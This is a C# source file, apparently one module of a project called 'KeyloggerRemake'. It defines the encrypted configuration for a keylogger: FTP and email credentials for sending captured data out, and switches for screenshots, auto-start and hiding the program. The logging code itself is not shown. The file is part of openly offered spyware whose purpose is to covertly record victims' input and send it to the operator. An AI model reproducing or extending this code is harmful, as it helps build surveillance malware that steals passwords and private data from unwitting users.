using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using Newtonsoft.Json;

namespace KeyloggerRemake
{
    class classJsonObj
    {
        static String strEncryptedKey = ""; //Used to store the encrypted key to decrypt

        //Class used to deserialize the Json using Bson
        public class classJson
        {
            //The json object will have access to the following objects and their fields:
            public FTP FTP { get; set; }
            public Email Email { get; set; }
            public Check Check { get; set; }
        }

        //Class used to store the FTP values
        public class FTP
        {
            public string Host { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }

        //Class used to store the Email values
        public class Email
        {
            public string Host { get; set; }
            public int Port { get; set; }
            public string Window { get; set; }
            public string FromEmail { get; set; }
            public string Pass { get; set; }
            public string ToEmail { get; set; }
        }

        //Class used to store the Check values
        public class Check
        {
            public bool TakeScreenshot { get; set; }
            public bool SpecificLogging { get; set; }
            public bool SendEmail { get; set; }
            public bool UploadFTP { get; set; }
            public bool Start { get; set; }
            public bool Hide { get; set; }
        }

        //To initialize/get the decrypted json as an object
        public static classJson initializeObj()
        {
            strEncryptedKey = classGetEncryption.getEncryptedKey(); //Grabs the encrypted key

            return classGetEncryption.decryptBson(strEncryptedKey); //Decrypts the encrypted key and returns it as an object of classJson
        }
    }
}
